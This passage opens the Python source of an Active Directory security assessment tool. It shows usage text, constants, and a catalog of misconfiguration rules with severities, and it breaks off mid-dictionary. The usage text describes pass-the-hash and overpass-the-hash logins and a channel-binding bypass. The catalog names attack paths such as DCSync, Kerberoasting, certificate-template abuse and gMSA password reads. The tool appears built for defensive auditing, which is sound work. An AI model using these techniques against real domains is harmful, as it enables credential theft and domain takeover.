#!/usr/bin/env python3
"""
SCOUT - Security Configuration Observation & Understanding Tool
Active Directory security assessment for non-domain-joined Linux operators.

Operator-oriented internal AD assessment: control-path / domain-dominance
analysis, ADCS (ESC1-4/7/8/9), SCCM, WSUS, Kerberoasting/AS-REP, GPP/LAPS, RBCD,
gMSA/dMSA & KDS, Entra/AAD-Connect indicators, pre-staged computer accounts,
coercion/relay and spray surface, with MITRE ATT&CK mapping. Scored on two
independent axes — Exposure (easiest path to Tier 0) and Hygiene debt — with a
plain-English exposure verdict (no saturating gauge, no letter grade).
Data is collected over LDAP/LDAPS; SMB/SYSVOL checks use impacket where
available. Outputs an interactive single-file HTML report plus JSON and CSV.

Auth options (impacket / bloodhound-python style):
  -u user -p pass         -d domain.local --dc-ip 10.0.0.1
  -u user -H :NThash      -d domain.local --dc-ip 10.0.0.1            (PtH)
  -u user -p pass  -k     -d domain.local --dc-ip 10.0.0.1           (request a TGT)
  -u user -H :NThash -k   -d domain.local --dc-ip 10.0.0.1   (overpass-the-hash)
  --aes-key <hex>         -d domain.local --dc-ip 10.0.0.1
  --ccache user.ccache    -d domain.local --dc-ip 10.0.0.1   (or KRB5CCNAME)
  --null-session          -d domain.local --dc-ip 10.0.0.1

Kerberos (-k) requests the ticket itself and binds with GSS-SPNEGO, which
satisfies "LDAP signing required" and — over plain 389 — bypasses LDAPS
channel binding (EPA). Use --save-ccache to keep the TGT for reuse.
"""

import argparse
import base64
import binascii
from binascii import unhexlify
import datetime
import hashlib
import html as html_mod
import io
import ipaddress
import json
import math
import os
import re
import socket
import ssl
import struct
import tempfile
import sys
import traceback
import xml.etree.ElementTree as ET
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

try:
    import ldap3
    from ldap3 import ALL, DSA, NTLM, SASL, GSSAPI, SIMPLE, Server, Connection, AUTO_BIND_NO_TLS, AUTO_BIND_TLS_BEFORE_BIND
    from ldap3.core.exceptions import LDAPException, LDAPBindError, LDAPSocketOpenError
    from ldap3.protocol.microsoft import security_descriptor_control
except ImportError:
    print("[-] ldap3 not installed: pip3 install ldap3")
    sys.exit(1)

try:
    from impacket.smbconnection import SMBConnection
    from impacket.nmb import NetBIOSTimeout
    HAS_IMPACKET_SMB = True
except ImportError:
    HAS_IMPACKET_SMB = False

try:
    from impacket.ldap import ldaptypes as _ldaptypes
    HAS_IMPACKET_LDAP = True
except ImportError:
    HAS_IMPACKET_LDAP = False

try:
    from Crypto.Cipher import AES
    HAS_PYCRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES
        HAS_PYCRYPTO = True
    except ImportError:
        HAS_PYCRYPTO = False

VERSION = "2.0.0"
TOOL_NAME = "SCOUT"
TOOL_LONG = "Security Configuration Observation & Understanding Tool"

# ── UAC flags ─────────────────────────────────────────────────────────────────
UAC_ACCOUNTDISABLE         = 0x00000002
UAC_PASSWD_NOTREQD         = 0x00000020
UAC_ENCRYPTED_TEXT_PWD     = 0x00000080  # reversible encryption
UAC_NORMAL_ACCOUNT         = 0x00000200
UAC_INTERDOMAIN_TRUST      = 0x00000800
UAC_WORKSTATION_TRUST      = 0x00001000
UAC_SERVER_TRUST           = 0x00002000
UAC_DONT_EXPIRE_PASSWORD   = 0x00010000
UAC_SMARTCARD_REQUIRED     = 0x00040000
UAC_TRUSTED_FOR_DELEGATION = 0x00080000  # unconstrained
UAC_NOT_DELEGATED          = 0x00100000
UAC_USE_DES_KEY_ONLY       = 0x00200000
UAC_DONT_REQUIRE_PREAUTH   = 0x00400000
UAC_TRUSTED_TO_AUTH        = 0x01000000  # protocol transition
UAC_PARTIAL_SECRETS        = 0x04000000  # RODC

# ── Trust attributes ──────────────────────────────────────────────────────────
TRUST_ATTR_NON_TRANSITIVE   = 0x00000001
TRUST_ATTR_UPLEVEL_ONLY     = 0x00000002
TRUST_ATTR_QUARANTINED      = 0x00000004  # SID filtering
TRUST_ATTR_FOREST           = 0x00000008
TRUST_ATTR_CROSS_ORG        = 0x00000010  # selective auth
TRUST_ATTR_WITHIN_FOREST    = 0x00000020
TRUST_ATTR_TREAT_EXTERNAL   = 0x00000040
TRUST_ATTR_RC4              = 0x00000080
TRUST_ATTR_TGT_DELEGATION   = 0x00000800
TRUST_TYPE_DOWNLEVEL        = 1
TRUST_TYPE_UPLEVEL          = 2
TRUST_TYPE_MIT              = 3
TRUST_DIR_DISABLED          = 0
TRUST_DIR_INBOUND           = 1
TRUST_DIR_OUTBOUND          = 2
TRUST_DIR_BIDIRECT          = 3

# ── FILETIME constants ────────────────────────────────────────────────────────
FILETIME_NEVER = 9223372036854775807  # 0x7FFFFFFFFFFFFFFF
FILETIME_ZERO  = 0

# ── Schema / functional levels ────────────────────────────────────────────────
SCHEMA_VERSIONS = {13:"2000",30:"2003",31:"2003R2",44:"2008",47:"2008R2",
                   56:"2012",69:"2012R2",81:"2016",87:"2019",88:"2022"}
FUNCTIONAL_LEVELS = {0:"2000",1:"2003 Interim",2:"2003",3:"2008",
                     4:"2008R2",5:"2012",6:"2012R2",7:"2016/2019/2022"}

# ── Rule catalog: id -> (title, category, points, severity) ─────────────────
# severity: INFO LOW MEDIUM HIGH CRITICAL
RULES: Dict[str, Tuple[str, str, int, str]] = {
    # Anomaly
    "A-Krbtgt":               ("Krbtgt password not changed in >180 days","Anomaly",25,"HIGH"),
    "A-LAPS-Not-Installed":   ("LAPS not installed (no schema attribute)","Anomaly",10,"MEDIUM"),
    "A-LAPS-Joined-Computers":("Domain computers without LAPS password set","Anomaly",10,"MEDIUM"),
    "A-NullSession":          ("Null session authentication allowed","Anomaly",15,"HIGH"),
    "A-PreWin2000Anonymous":  ("Pre-Win2000 Compatible Access contains anonymous","Anomaly",20,"HIGH"),
    "A-PreWin2000AuthenticatedUsers":("Pre-Win2000 group contains Authenticated Users","Anomaly",10,"MEDIUM"),
    "A-PreWin2000Other":      ("Pre-Win2000 group has non-standard members","Anomaly",10,"MEDIUM"),
    "A-Guest":                ("Built-in Guest account is enabled","Anomaly",10,"MEDIUM"),
    "A-MinPwdLen":            ("Minimum password length < 8 characters","Anomaly",5,"LOW"),
    "A-ReversiblePwd":        ("Accounts with reversible password encryption","Anomaly",15,"HIGH"),
    "A-LMHashAuthorized":     ("LM hash storage not disabled","Anomaly",25,"CRITICAL"),
    "A-AeA":                  ("AES encryption not required for Kerberos","Anomaly",5,"INFO"),
    "A-DsHeuristicsAnonymous":("Anonymous LDAP operations allowed","Anomaly",25,"HIGH"),
    "A-DsHeuristicsLDAPSecurity":("LDAP security heuristics weakened","Anomaly",10,"MEDIUM"),
    "A-DsHeuristicsAllowAnonNSPI":("Anonymous NSPI access allowed","Anomaly",10,"MEDIUM"),
    "A-LDAPSigningDisabled":  ("LDAP signing not required (GPO)","Anomaly",15,"HIGH"),
    "A-DCLdapSign":           ("LDAP signing not enforced on DC","Anomaly",15,"HIGH"),
    "A-DCLdapsProtocol":      ("LDAPS uses weak TLS (1.0/1.1)","Anomaly",10,"MEDIUM"),
    "A-DCLdapsChannelBinding":("LDAPS channel binding not enabled","Anomaly",15,"HIGH"),
    "A-DCLdapsProtocolAdvanced":("LDAPS advanced protocol weakness","Anomaly",10,"MEDIUM"),
    "A-SMB2SignatureNotEnabled":("SMB2 signing not enabled on DC","Anomaly",25,"CRITICAL"),
    "A-SMB2SignatureNotRequired":("SMB2 signing not required on DC","Anomaly",15,"HIGH"),
    "A-RootDseAnonBinding":   ("Anonymous LDAP binding allowed","Anomaly",10,"MEDIUM"),
    "A-MembershipEveryone":   ("Everyone/Authenticated Users in privileged group","Anomaly",100,"CRITICAL"),
    "A-ProtectedUsers":       ("Protected Users group not used for privileged accounts","Anomaly",10,"MEDIUM"),
    "A-PwdGPO":               ("Weak password policy enforced via GPO","Anomaly",10,"MEDIUM"),
    "A-PwdComplexity":        ("Password complexity not required","Anomaly",10,"MEDIUM"),
    "A-PwdHistory":           ("Password history length below recommended","Anomaly",5,"INFO"),
    "A-PwdMaxAge":            ("Password maximum age not enforced","Anomaly",5,"INFO"),
    "A-NoGPOLLMNR":           ("LLMNR not disabled via GPO","Anomaly",10,"MEDIUM"),
    "A-NoNetSessionHardening":("NetSessionEnum hardening not enabled","Anomaly",15,"HIGH"),
    "A-DC-Spooler":           ("Print Spooler service enabled on DC","Anomaly",25,"HIGH"),
    "A-DC-WebClient":         ("WebClient service enabled on DC","Anomaly",25,"HIGH"),
    "A-DC-Coerce":            ("DC coercion vector present (Spooler or WebClient)","Anomaly",30,"CRITICAL"),
    "A-DCRefuseComputerPwdChange":("DC refuses computer password change","Anomaly",5,"LOW"),
    "A-DnsZoneUpdate1":       ("DNS zone allows unsecured dynamic updates","Anomaly",25,"HIGH"),
    "A-DnsZoneUpdate2":       ("DNS zone update policy insecure","Anomaly",10,"MEDIUM"),
    "A-DnsZoneTransfert":     ("DNS zone transfer unrestricted","Anomaly",10,"MEDIUM"),
    "A-DnsZoneAUCreateChild": ("Authenticated Users can create DNS child objects","Anomaly",10,"MEDIUM"),
    "A-NotEnoughDC":          ("Fewer than 2 domain controllers","Anomaly",5,"LOW"),
    "A-NTFRSOnSysvol":        ("SYSVOL still using deprecated NTFRS","Anomaly",5,"LOW"),
    "A-SmartCardPwdRotation": ("Smart-card accounts lack 60-day password rotation","Anomaly",5,"LOW"),
    "A-SmartCardRequired":    ("Privileged accounts lack smart-card enforcement","Anomaly",5,"LOW"),
    "A-AdminSDHolder":        ("AdminSDHolder ACL inconsistency detected","Anomaly",25,"HIGH"),
    "A-CertEnrollHttp":       ("ADCS enrollment available over plain HTTP","Anomaly",30,"CRITICAL"),
    "A-CertEnrollChannelBinding":("ADCS enrollment channel binding not configured","Anomaly",25,"HIGH"),
    "A-CertTempAgent":        ("Certificate template: agent enrollment abuse (ESC3)","Anomaly",50,"CRITICAL"),
    "A-CertTempAnyone":       ("Certificate template: any principal can enroll","Anomaly",40,"CRITICAL"),
    "A-CertTempAnyPurpose":   ("Certificate template: Any Purpose EKU (ESC2)","Anomaly",40,"CRITICAL"),
    "A-CertTempCustomSubject":("Certificate template: requester-supplied SAN (ESC1)","Anomaly",50,"CRITICAL"),
    "A-CertTempNoSecurity":   ("Certificate template: no security applied","Anomaly",50,"CRITICAL"),
    "A-CertROCA":             ("ROCA weak RSA key in certificate","Anomaly",30,"CRITICAL"),
    "A-CertWeakDSA":          ("Weak DSA key in certificate","Anomaly",10,"MEDIUM"),
    "A-CertWeakRsaComponent": ("Weak RSA component in certificate","Anomaly",25,"HIGH"),
    "A-BadSuccessor":         ("dMSA bad-successor attack delegation exists","Anomaly",50,"CRITICAL"),
    "A-WeakRSARootCert":      ("Root CA uses weak RSA (<2048-bit)","Anomaly",10,"MEDIUM"),
    "A-WeakRSARootCert2":     ("Intermediate CA uses weak RSA key","Anomaly",10,"MEDIUM"),
    "A-SHA1RootCert":         ("Root CA uses SHA-1 signature","Anomaly",5,"LOW"),
    "A-MD5RootCert":          ("Root CA uses MD5 signature","Anomaly",15,"HIGH"),
    "A-MD5IntermediateCert":  ("Intermediate CA uses MD5 signature","Anomaly",15,"HIGH"),
    "A-SHA0RootCert":         ("Root CA uses SHA-0 signature","Anomaly",25,"HIGH"),
    "A-NoServicePolicy":      ("No service account policy enforced","Anomaly",5,"LOW"),
    "A-BackupMetadata":       ("Backup metadata/tombstone accessible","Anomaly",10,"MEDIUM"),
    "A-AuditDC":              ("Insufficient audit policy on domain controllers","Anomaly",5,"LOW"),
    "A-AuditPowershell":      ("PowerShell script block logging not enabled","Anomaly",5,"LOW"),
    "A-AnonymousAuthorizedGPO":("Anonymous principal authorized on GPO","Anomaly",15,"HIGH"),
    "A-LimitBlankPasswordUse":("Blank passwords accessible from network","Anomaly",25,"HIGH"),
    "A-WSUS-SslProtocol":     ("WSUS using weak SSL/TLS protocol","Anomaly",10,"MEDIUM"),
    # Privileged
    "P-AdminNum":             ("Excessive domain administrator accounts","Privileged",25,"HIGH"),
    "P-AdminPwdTooOld":       ("Admin account password not changed in >90 days","Privileged",25,"HIGH"),
    "P-AdminLogin":           ("Admin accounts that have never logged in","Privileged",5,"LOW"),
    "P-AdminEmailOn":         ("Admin accounts with email attributes","Privileged",5,"LOW"),
    "P-Inactive":             ("Inactive privileged accounts (>180 days)","Privileged",25,"HIGH"),
    "P-Kerberoasting":        ("Privileged accounts with SPN (Kerberoastable)","Privileged",25,"HIGH"),
    "P-UnconstrainedDelegation":("Unconstrained delegation on non-DC account","Privileged",100,"CRITICAL"),
    "P-UnkownDelegation":     ("Misconfigured or unknown delegation type","Privileged",25,"HIGH"),
    "P-DelegationDCt2a4d":    ("DC account trusted for protocol transition (T2A4D)","Privileged",50,"CRITICAL"),
    "P-DelegationDCa2d2":     ("DC account A2D2 delegation","Privileged",50,"CRITICAL"),
    "P-DelegationDCsourcedeleg":("DC source delegation misconfigured","Privileged",25,"HIGH"),
    "P-DelegationEveryone":   ("Everyone principal has delegation rights","Privileged",50,"CRITICAL"),
    "P-DelegationKeyAdmin":   ("Key Admin delegation misconfigured","Privileged",50,"CRITICAL"),
    "P-DelegationGPOData":    ("GPO data delegation grants excessive access","Privileged",25,"HIGH"),
    "P-DelegationLoginScript":("Login script delegation misconfigured","Privileged",25,"HIGH"),
    "P-DelegationFileDeployed":("File deployment delegation","Privileged",25,"HIGH"),
    "P-DangerousExtendedRight":("Dangerous extended rights on AD object","Privileged",50,"CRITICAL"),
    "P-ControlPathIndirectEveryone":("Everyone has indirect control path to admin","Privileged",50,"CRITICAL"),
    "P-ControlPathIndirectMany":("Many users have indirect control path to admin","Privileged",25,"HIGH"),
    "P-DNSAdmin":             ("DNSAdmins group has members","Privileged",15,"HIGH"),
    "P-DNSDelegation":        ("DNS delegation object misconfigured","Privileged",25,"HIGH"),
    "P-ExchangePrivEsc":      ("Exchange configuration allows privilege escalation","Privileged",50,"CRITICAL"),
    "P-ExchangeAdminSDHolder":("Exchange groups in AdminSDHolder scope","Privileged",25,"HIGH"),
    "P-RODCAdminRevealed":    ("Privileged account credential revealed to RODC","Privileged",25,"HIGH"),
    "P-RODCKrbtgtOrphan":     ("Orphaned RODC krbtgt account","Privileged",10,"MEDIUM"),
    "P-RODCSYSVOLWrite":      ("RODC has write access to SYSVOL","Privileged",50,"CRITICAL"),
    "P-RODCNeverReveal":      ("RODC msDS-NeverRevealGroup not configured","Privileged",5,"LOW"),
    "P-RODCRevealOnDemand":   ("RODC reveal-on-demand includes privileged accounts","Privileged",10,"MEDIUM"),
    "P-RODCAllowedGroup":     ("RODC allowed group not configured","Privileged",5,"LOW"),
    "P-RODCDeniedGroup":      ("RODC denied group not configured","Privileged",5,"LOW"),
    "P-ServiceDomainAdmin":   ("Service account is member of Domain Admins","Privileged",50,"CRITICAL"),
    "P-SchemaAdmin":          ("Schema Admins group is not empty","Privileged",25,"HIGH"),
    "P-RecycleBin":           ("AD Recycle Bin not enabled","Privileged",5,"LOW"),
    "P-ProtectedUsers":       ("Privileged accounts not in Protected Users group","Privileged",10,"MEDIUM"),
    "P-LogonDenied":          ("Admin accounts not restricted by deny-logon GPO","Privileged",10,"MEDIUM"),
    "P-LoginDCEveryone":      ("Everyone allowed interactive logon to DC","Privileged",25,"HIGH"),
    "P-OperatorsEmpty":       ("Built-in operator groups are empty (controls missing)","Privileged",5,"LOW"),
    "P-PrivilegeEveryone":    ("Sensitive privilege assigned to Everyone","Privileged",50,"CRITICAL"),
    "P-UnprotectedOU":        ("OUs without accidental-deletion protection","Privileged",5,"LOW"),
    "P-RecoveryModeUnprotected":("DSRM password not set/protected","Privileged",25,"HIGH"),
    "P-TrustedCredManAccessPrivilege":("SeTrustedCredManAccessPrivilege granted","Privileged",25,"HIGH"),
    "P-DsHeuristicsAdminSDExMask":("AdminSDHolder exclusion mask weakened","Privileged",10,"MEDIUM"),
    "P-DsHeuristicsDoListObject":("List-Object mode disabled","Privileged",5,"LOW"),
    "P-DisplaySpecifier":     ("Display specifier abuse possible","Privileged",25,"HIGH"),
    "P-Delegated":            ("Non-standard delegation on AD object","Privileged",15,"MEDIUM"),
    # Stale
    "S-Inactive":             ("User accounts inactive >180 days","Stale",5,"LOW"),
    "S-C-Inactive":           ("Computer accounts inactive >45 days","Stale",5,"LOW"),
    "S-DC-Inactive":          ("Domain controller account inactive","Stale",25,"HIGH"),
    "S-DC-NotUpdated":        ("Domain controllers not patched recently","Stale",10,"MEDIUM"),
    "S-PwdNeverExpires":      ("Accounts with password set to never expire","Stale",5,"LOW"),
    "S-PwdNotRequired":       ("Accounts where no password is required","Stale",15,"HIGH"),
    "S-Reversible":           ("User accounts with reversible encryption","Stale",15,"HIGH"),
    "S-DesEnabled":           ("Accounts with DES-only encryption","Stale",15,"HIGH"),
    "S-NoPreAuth":            ("User accounts without Kerberos pre-auth","Stale",15,"HIGH"),
    "S-NoPreAuthAdmin":       ("Admin accounts without Kerberos pre-auth","Stale",25,"CRITICAL"),
    "S-SIDHistory":           ("Accounts with SID history set","Stale",10,"MEDIUM"),
    "S-PwdLastSet-45":        ("Enabled accounts with password >45 days old","Stale",5,"INFO"),
    "S-PwdLastSet-90":        ("Enabled accounts with password >90 days old","Stale",5,"LOW"),
    "S-PwdLastSet-DC":        ("DC computer account password >45 days old","Stale",25,"HIGH"),
    "S-PwdLastSet-Cluster":   ("Cluster account password >45 days old","Stale",5,"LOW"),
    "S-FunctionalLevel1":     ("Domain/Forest functional level 2003 or below","Stale",25,"HIGH"),
    "S-FunctionalLevel3":     ("Domain/Forest functional level 2008","Stale",10,"MEDIUM"),
    "S-FunctionalLevel4":     ("Domain/Forest functional level 2008 R2","Stale",5,"LOW"),
    "S-OS-XP":                ("Windows XP/Server 2003 computers in domain","Stale",25,"HIGH"),
    "S-OS-Vista":             ("Windows Vista/Server 2008 computers in domain","Stale",15,"HIGH"),
    "S-OS-NT":                ("NT4-era OS present in domain","Stale",25,"CRITICAL"),
    "S-OS-W10":               ("End-of-life Windows 10 builds present","Stale",5,"LOW"),
    "S-SMB-v1":               ("SMBv1 enabled on domain controller","Stale",25,"HIGH"),
    "S-Duplicate":            ("Duplicate (CNF:) accounts detected","Stale",5,"LOW"),
    "S-Domain$$$":            ("Orphaned Domain$$$ accounts present","Stale",5,"LOW"),
    "S-AesNotEnabled":        ("Accounts without AES encryption types","Stale",5,"INFO"),
    "S-PrimaryGroup":         ("Users with non-default primary group","Stale",5,"LOW"),
    "S-C-PrimaryGroup":       ("Computers with non-default primary group","Stale",5,"LOW"),
    "S-C-Reversible":         ("Computer accounts with reversible encryption","Stale",10,"MEDIUM"),
    "S-DC-SubnetMissing":     ("DC IP not covered by any AD Sites subnet","Stale",5,"LOW"),
    "S-DefaultOUChanged":     ("Default computer OU changed from standard","Stale",5,"LOW"),
    "S-KerberosArmoring":     ("Kerberos FAST/armoring not enabled","Stale",5,"LOW"),
    "S-KerberosArmoringDC":   ("Kerberos armoring not required on DCs","Stale",5,"LOW"),
    "S-JavaSchema":           ("Java/COM schema extensions present","Stale",5,"LOW"),
    "S-TerminalServicesGPO":  ("Deprecated Terminal Services settings in GPO","Stale",5,"LOW"),
    "S-Vuln-MS14-068":        ("Domain may be vulnerable to MS14-068 (PAC forgery)","Stale",100,"CRITICAL"),
    "S-Vuln-MS17_010":        ("Host vulnerable to MS17-010 (EternalBlue)","Stale",100,"CRITICAL"),
    "S-ADRegistration":       ("AD registration schema inconsistency","Stale",5,"LOW"),
    "S-WSUS-HTTP":            ("WSUS server uses unencrypted HTTP","Stale",25,"HIGH"),
    "S-WSUS-NoPinning":       ("WSUS no certificate pinning","Stale",10,"MEDIUM"),
    "S-WSUS-UserProxy":       ("WSUS uses user-context proxy","Stale",10,"MEDIUM"),
    "S-DefenderASR":          ("Defender ASR rules not configured","Stale",5,"LOW"),
    "S-FirewallScript":       ("Firewall script deployed via logon GPO","Stale",5,"LOW"),
    "S-FolderOptions":        ("Hidden file options controlled via GPO","Stale",5,"LOW"),
    # Trust
    "T-Inactive":             ("Trust relationship has not been used recently","Trust",5,"LOW"),
    "T-Downlevel":            ("NT4-style (downlevel) trust present","Trust",10,"MEDIUM"),
    "T-SIDFiltering":         ("SID filtering not enabled on trust","Trust",25,"HIGH"),
    "T-SIDHistoryDangerous":  ("Dangerous SID history across trust boundary","Trust",50,"CRITICAL"),
    "T-SIDHistorySameDomain": ("SID history within same domain","Trust",10,"MEDIUM"),
    "T-SIDHistoryUnknownDomain":("SID history from unrecognized domain","Trust",10,"MEDIUM"),
    "T-TGTDelegation":        ("TGT delegation enabled on trust","Trust",50,"CRITICAL"),
    "T-AzureADSSO":           ("Azure AD Seamless SSO account misconfigured","Trust",25,"HIGH"),
    "T-ScriptOutOfDomain":    ("Login scripts referenced from outside the domain","Trust",10,"MEDIUM"),
    "T-FileDeployedOutOfDomain":("Files deployed from untrusted external domain","Trust",10,"MEDIUM"),
    "T-Dc":                   ("Trust target DC has issues","Trust",10,"MEDIUM"),
    # GPO / SYSVOL
    "P-GPPPassword":          ("GPP password (cpassword) found in SYSVOL","Privileged",100,"CRITICAL"),
    "P-ModifiableGPO":        ("GPO DACL allows broad principal write access","Privileged",75,"CRITICAL"),
    "P-DCSync":               ("Non-admin principal has DCSync rights on domain root","Privileged",100,"CRITICAL"),
    "P-DangerousACLDomain":   ("Broad principal has WriteDACL/WriteOwner/GenericAll on domain root","Privileged",100,"CRITICAL"),
    "P-DangerousACLDA":       ("Broad principal can write to Domain Admins group","Privileged",100,"CRITICAL"),
    "P-DangerousACLGPO":      ("Broad principal can modify high-value GPO","Privileged",75,"CRITICAL"),
    "P-MachineAccountQuota":  ("ms-DS-MachineAccountQuota > 0 (any user can add machine accounts)","Privileged",25,"HIGH"),
    "P-OwnsPrivObject":       ("Broad principal owns a privileged AD object","Privileged",50,"CRITICAL"),
    "P-WriteToPrivGroup":     ("Broad principal can add members to privileged group","Privileged",100,"CRITICAL"),
    "A-WDigest":              ("WDigest UseLogonCredential enabled via GPO","Anomaly",50,"CRITICAL"),
    "A-LMCompatibilityLevel": ("LmCompatibilityLevel < 3 via GPO (NTLMv1 allowed)","Anomaly",50,"CRITICAL"),
    "A-LLMNR":                ("LLMNR not disabled via GPO","Anomaly",25,"HIGH"),
    "A-NBTNSDisabled":        ("NetBIOS Name Service not disabled via GPO","Anomaly",15,"MEDIUM"),
    "A-CredentialGuard":      ("Credential Guard not configured via GPO","Anomaly",10,"MEDIUM"),
    "A-HardenedPaths":        ("UNC hardened paths not configured via GPO","Anomaly",25,"HIGH"),
    "A-PowerShellLogging":    ("PowerShell script block logging not enabled","Anomaly",10,"MEDIUM"),
    "A-PowerShellTranscript": ("PowerShell transcription not enabled","Anomaly",5,"LOW"),
    "A-WSUS-HTTP":            ("WSUS WUServer using HTTP (not HTTPS)","Anomaly",25,"HIGH"),
    "A-LocalAdminPassword":   ("LAPS not deployed — local admin passwords unmanaged","Anomaly",50,"CRITICAL"),
    "A-PrivilegeAudit":       ("Audit Policy not configured via GPO","Anomaly",15,"MEDIUM"),
    "S-Kerberoastable":       ("Kerberoastable accounts with weak encryption","Stale",25,"HIGH"),
    "S-KerberoastableAdmin":  ("Kerberoastable admin accounts","Stale",100,"CRITICAL"),
    # ── Added in v2 — modern escalation & hardening coverage ──────────────────
    "P-RBCD":                 ("Resource-based constrained delegation configured on account","Privileged",25,"HIGH"),
    "P-RBCD-Dangerous":       ("RBCD configured on a domain controller / Tier-0 object","Privileged",100,"CRITICAL"),
    "P-ConstrainedDelegService":("Constrained delegation (S4U2Proxy) on a service account","Privileged",25,"HIGH"),
    "P-ComputerInPrivGroup":  ("Computer account is a member of a privileged group","Privileged",50,"CRITICAL"),
    "P-AdminCountOrphan":     ("Orphaned adminCount=1 objects (former privilege, restrictive ACL)","Privileged",10,"MEDIUM"),
    "S-SIDHistoryPrivileged": ("SID history references a privileged / built-in SID","Privileged",75,"CRITICAL"),
    "A-RestrictRemoteSAM":    ("RestrictRemoteSAM not enforced (anonymous SAM enumeration)","Anomaly",10,"MEDIUM"),
    "A-NTLMAudit":            ("NTLM auditing not enabled (RestrictSendingNTLMTraffic)","Anomaly",5,"LOW"),
    "A-DSRMLogon":            ("DSRM administrator allowed to log on over the network","Anomaly",25,"HIGH"),
    "A-CertTemplateESC4":     ("Certificate template ACL writable by low-privileged principal (ESC4)","Anomaly",50,"CRITICAL"),
    "A-CertCAManageLowPriv":  ("Low-privileged principal holds CA management rights (ESC7)","Anomaly",50,"CRITICAL"),
    "A-CertTemplateESC9":     ("Certificate template has no security extension — weak cert mapping (ESC9)","Anomaly",40,"HIGH"),
    "P-ControlPathDA":        ("Non-privileged principals have a control path to Domain Admin","Privileged",75,"CRITICAL"),
    "A-SCCMContainerACL":     ("System Management (SCCM) container writable by a broad principal","Anomaly",40,"HIGH"),
    "A-SCCM":                 ("SCCM/MECM site infrastructure exposed (relay / NAA / PXE attack surface)","Anomaly",40,"HIGH"),
    "A-Pre2kComputer":        ("Pre-created (pre-Windows 2000) computer accounts with a predictable password","Anomaly",50,"HIGH"),
    "A-WeakLockout":          ("No / weak account-lockout policy (password spraying viable)","Anomaly",25,"HIGH"),
    # ── Added — managed-account / KDS / Entra / GPO-link coverage (roadmap) ────
    "P-GMSAReadable":         ("gMSA/dMSA managed password readable by a broad principal","Privileged",50,"CRITICAL"),
    "A-KDSRootKey":           ("KDS root key readable — offline gMSA password compromise (GoldenGMSA)","Anomaly",50,"CRITICAL"),
    "A-AADConnectSync":       ("Entra/Azure AD Connect sync account present (DCSync-capable)","Anomaly",25,"HIGH"),
    "A-SeamlessSSO":          ("Entra Seamless SSO computer account (AZUREADSSOACC$) key is stale","Anomaly",25,"HIGH"),
    "S-OrphanedGPO":          ("Orphaned / unlinked GPOs present","Stale",5,"LOW"),
}

# Field/army palette — oxide red, rust, mustard/brass, olive drab, field gray.
SEV_COLOR = {"CRITICAL":"#b23a2e","HIGH":"#c2702a","MEDIUM":"#c9a227",
              "LOW":"#6f8f3f","INFO":"#8a8f78"}
CAT_COLOR  = {"Anomaly":"#c2702a","Privileged":"#a8843c",
               "Stale":"#5d7a86","Trust":"#6f8f3f"}

# ── Maturity model (CMMI 1-5, ANSSI-style) ───────────────────────────────────
# 1 = INITIAL (instantly exploitable / catastrophic hygiene gap) .. 5 = OPTIMIZING.
# The domain's achieved maturity = the LOWEST level among all still-failing rules,
# so one unfixed level-1 issue pins the whole domain at level 1.
# Default maturity is derived from severity; this table overrides specific rules.
SEV_TO_MATURITY = {"CRITICAL":1, "HIGH":2, "MEDIUM":3, "LOW":4, "INFO":5}
MATURITY_LABEL = {1:"Initial", 2:"Repeatable", 3:"Defined",
                  4:"Managed", 5:"Optimizing"}
MATURITY_DESC = {
    1: "AD security is unpredictable and ad-hoc. Instantly-exploitable issues "
       "remain — an attacker on the LAN can likely reach Domain Admin today.",
    2: "Basic checks happen but key serious misconfigurations persist. Internal "
       "trust hygiene and the overall risk score need to come down.",
    3: "Monitoring and hardening are defined: legacy protocols removed, admin "
       "tiering and logon restrictions in place.",
    4: "Controls are measured and managed; detection and prevention are effective "
       "(SOC rules, security GPOs, smart-card 2FA, bastion).",
    5: "Continuous improvement and threat hunting. Persistence and cross-domain "
       "movement are actively detected; ACL paths are analyzed.",
}
RULE_MATURITY: Dict[str, int] = {
    # Level 1 — fix immediately (domain-takeover class)
    "A-MembershipEveryone":1, "A-LMHashAuthorized":1, "A-LMCompatibilityLevel":1,
    "A-WDigest":1, "P-GPPPassword":1, "P-DCSync":1, "P-DangerousACLDomain":1,
    "P-DangerousACLDA":1, "P-WriteToPrivGroup":1, "P-OwnsPrivObject":1,
    "P-ModifiableGPO":1, "P-DangerousACLGPO":1, "P-ServiceDomainAdmin":1,
    "P-UnconstrainedDelegation":1, "A-CertTempCustomSubject":1, "A-CertTempNoSecurity":1,
    "A-CertTempAnyone":1, "A-CertTempAnyPurpose":1, "A-CertTempAgent":1,
    "A-CertEnrollHttp":1, "A-CertTemplateESC4":1,
    "S-KerberoastableAdmin":1, "S-NoPreAuthAdmin":1, "S-Vuln-MS14-068":1,
    "S-Vuln-MS17_010":1, "A-DC-Coerce":1, "A-MD5RootCert":1, "A-SHA0RootCert":1,
    "A-BadSuccessor":1, "T-SIDHistoryDangerous":1, "T-TGTDelegation":1,
    "P-DelegationEveryone":1, "P-DelegationKeyAdmin":1, "P-DelegationDCt2a4d":1,
    "P-DelegationDCa2d2":1, "P-DangerousExtendedRight":1, "P-ControlPathIndirectEveryone":1,
    "P-PrivilegeEveryone":1, "P-RBCD-Dangerous":1, "P-ComputerInPrivGroup":1,
    "S-SIDHistoryPrivileged":1, "A-Krbtgt":1, "P-ExchangePrivEsc":1,
    # Level 2 — serious
    "P-Kerberoasting":2, "S-Kerberoastable":2, "P-MachineAccountQuota":2,
    "A-NullSession":2, "A-PreWin2000Anonymous":2, "A-DCLdapSign":2,
    "A-DCLdapsChannelBinding":2, "A-SMB2SignatureNotEnabled":2, "A-SMB2SignatureNotRequired":2,
    "A-LDAPSigningDisabled":2, "A-ReversiblePwd":2, "S-Reversible":2, "S-C-Reversible":2,
    "A-DsHeuristicsAnonymous":2, "S-NoPreAuth":2, "T-SIDFiltering":2, "A-AdminSDHolder":2,
    "A-DnsZoneUpdate1":2, "A-DnsZoneAUCreateChild":2, "A-DC-Spooler":2, "A-DC-WebClient":2,
    "P-DNSAdmin":2, "S-DesEnabled":2, "P-RBCD":2, "P-ConstrainedDelegService":2,
    "P-AdminCountOrphan":2, "A-CertROCA":2, "P-Inactive":2,
    "A-CertWeakRsaComponent":2, "P-SchemaAdmin":2, "A-RestrictRemoteSAM":2,
    # Level 3 — hardening
    "A-LLMNR":3, "A-NBTNSDisabled":3, "A-HardenedPaths":3, "A-CredentialGuard":3,
